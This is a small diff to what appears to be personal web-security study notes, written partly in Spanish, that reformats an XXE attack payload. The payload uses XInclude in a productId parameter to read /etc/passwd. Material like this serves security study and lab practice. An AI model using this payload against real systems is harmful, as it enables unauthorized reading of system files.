@@ -71,8 +71,7 @@ No olvidar llamar la variable &xxe; dentro de <productId>&xxe;<productId/>
 
 - XXE -> Use XInclude in a parameter (url encode the payload)
 ```html
-?productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include parse="text" href="file:///etc/passwd"/></foo>
+?productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
 or
 
